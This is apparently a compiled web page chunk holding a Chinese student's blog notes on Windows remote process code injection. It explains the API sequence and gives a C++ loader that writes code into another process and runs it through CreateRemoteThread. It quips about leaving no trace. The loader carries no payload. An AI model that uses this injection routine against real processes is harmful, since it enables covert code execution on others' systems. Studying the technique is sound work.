(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{366:function(s,t,e){"use strict";e.r(t);var n=e(8),r=Object(n.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("p",[s._v("上学期学了有关 Windows 程序底层方面的知识，学习到病毒的基本工作原理。好记性不如烂笔头，学完之余还是写点东西出来吧～\n不过我也只是抛砖引玉，详细知识还是得自己多多钻研～")]),s._v(" "),e("h2",{attrs:{id:"首先打开进程"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#首先打开进程"}},[s._v("#")]),s._v(" 首先打开进程")]),s._v(" "),e("p",[s._v("首先使用 Win 系统的"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("OpenProcess"),e("OutboundLink")],1),s._v("API 打开所要注入的进程。\n使用参数是进程的 PID，可以使用任务管理器查看进程的 PID，打开成功之后返回程序的句柄。")]),s._v(" "),e("h2",{attrs:{id:"开辟内存空间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#开辟内存空间"}},[s._v("#")]),s._v(" 开辟内存空间")]),s._v(" "),e("p",[s._v("Win 系统也提供了开辟内存空间的"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("VirtualAllocEx"),e("OutboundLink")],1),s._v("API。\n传入的参数包括进程句柄，开辟起始地址，开辟空间的大小，分配的数据类型，分配空间的权限。例如： "),e("code",[s._v("pRemoteCode = (PBYTE) VirtualAllocEx(hProcess, 0, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);")])]),s._v(" "),e("h2",{attrs:{id:"写入恶意代码"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写入恶意代码"}},[s._v("#")]),s._v(" 写入恶意代码")]),s._v(" "),e("p",[s._v("使用 Win 系统的"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("WriteProcessMemory"),e("OutboundLink")],1),s._v("API 向新开辟的内存空间写入数据。注意这里写入的是二进制数据，要考虑到各种 API 函数的寻址问题。")]),s._v(" "),e("h2",{attrs:{id:"执行注入的代码"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#执行注入的代码"}},[s._v("#")]),s._v(" 执行注入的代码")]),s._v(" "),e("p",[s._v("微软照样还是提供了相关的"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms682437(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("CreateRemoteThread"),e("OutboundLink")],1),s._v("API，我们注意最后一个参数是输出而不是输入。")]),s._v(" "),e("h2",{attrs:{id:"获取执行的结果"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#获取执行的结果"}},[s._v("#")]),s._v(" 获取执行的结果")]),s._v(" "),e("p",[s._v("如果要获取执行的结果，首先我们得等待线程的执行完成，使用"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("WaitForSingleObject"),e("OutboundLink")],1),s._v("API.例： "),e("code",[s._v("WaitForSingleObject(hThread, INFINITE);")]),s._v("\n然后再使用"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683190(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("GetExitCodeThread"),e("OutboundLink")],1),s._v("API，得到返回的结果。")]),s._v(" "),e("h2",{attrs:{id:"释放开辟的空间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#释放开辟的空间"}},[s._v("#")]),s._v(" 释放开辟的空间")]),s._v(" "),e("p",[s._v("干了坏事得不留痕迹才行，回收自己开辟的空间，使用"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/aa366894(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("VirtualFreeEx"),e("OutboundLink")],1),s._v("API.")]),s._v(" "),e("h2",{attrs:{id:"关闭打开的进程"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#关闭打开的进程"}},[s._v("#")]),s._v(" 关闭打开的进程")]),s._v(" "),e("p",[s._v("打开的进程也得关闭，使用"),e("a",{attrs:{href:"https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx",target:"_blank",rel:"noopener noreferrer"}},[s._v("CloseHandle"),e("OutboundLink")],1),s._v("API.")]),s._v(" "),e("p",[s._v("代码示例：")]),s._v(" "),e("div",{staticClass:"language-c++ line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('hProcess = OpenProcess(PROCESS_CREATE_THREAD\n\t\t| PROCESS_QUERY_INFORMATION\n\t\t| PROCESS_VM_OPERATION\n\t\t| PROCESS_VM_WRITE\n\t\t| PROCESS_VM_READ,\n\t\tFALSE, PID);\n\nif (hProcess == NULL) {\n\t\tprintf("failed.\\n");\n\t\treturn -1;\n}\nprintf("ok.\\n");\n\nprintf("[I]: Allocating remote memory with size of 0x%08x ......",\n\t\tdwSizeOfCode);\n\npCodeRemote = (PBYTE) VirtualAllocEx(hProcess,\n\t\t\t\t0,\n\t\t\t\tdwSizeOfCode,\n\t\t\t\tMEM_COMMIT,\n\t\t\t\tPAGE_EXECUTE_READWRITE);\nif (pCodeRemote == NULL) {\n\t\tprintf("failed.\\n");\n\t\tCloseHandle(hProcess);\n\t\treturn -1;\n}\nprintf("ok at 0x%08x.\\n", pCodeRemote);\n\ndo_link_before_inj(pCodeRemote);\n\nprintf("[I]: Writing code ......");\nif (WriteProcessMemory(hProcess,\n\t\t\t\tpCodeRemote,\n\t\t\t\tpCode,\n\t\t\t\tdwSizeOfCode,\n\t\t\t\t&dwNumBytesXferred) == 0) {\n\t\tprintf("failed.\\n");\n\t\tVirtualFreeEx(hProcess, pCodeRemote,\n\t\t\t\t\t\tdwSizeOfCode, MEM_RELEASE);\n\t\tCloseHandle(hProcess);\n\t\treturn -1;\n};\nprintf("ok (%d bytes were written).\\n", dwNumBytesXferred);\n\nprintf("[I]: Creating a remote thread ......");\nhThread = CreateRemoteThread(hProcess, NULL, 0,\n\t\t\t\t(LPTHREAD_START_ROUTINE) pCodeRemote,\n\t\t\t\tpCodeRemote, 0 , &dwThreadId);\nif (hThread == 0) {\n\t\tprintf("failed.\\n");\n\t\tif ( pCodeRemote != 0 )\n\t\t\t\tVirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);\n\t\tif ( hThread != 0 )\n\t\t\t\tCloseHandle(hThread);\n\t\treturn -1;\n}\nprintf("ok.\\n");\n\nprintf("[I]: Waiting the remote thread ......");\nWaitForSingleObject(hThread, INFINITE);\nGetExitCodeThread(hThread, (PDWORD) &exitcode);\nprintf("exited with 0x%08X\\n", exitcode);\n\nVirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);\nCloseHandle(hProcess);\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br"),e("span",{staticClass:"line-number"},[s._v("56")]),e("br"),e("span",{staticClass:"line-number"},[s._v("57")]),e("br"),e("span",{staticClass:"line-number"},[s._v("58")]),e("br"),e("span",{staticClass:"line-number"},[s._v("59")]),e("br"),e("span",{staticClass:"line-number"},[s._v("60")]),e("br"),e("span",{staticClass:"line-number"},[s._v("61")]),e("br"),e("span",{staticClass:"line-number"},[s._v("62")]),e("br"),e("span",{staticClass:"line-number"},[s._v("63")]),e("br"),e("span",{staticClass:"line-number"},[s._v("64")]),e("br"),e("span",{staticClass:"line-number"},[s._v("65")]),e("br")])])])}),[],!1,null,null,null);t.default=r.exports}}]);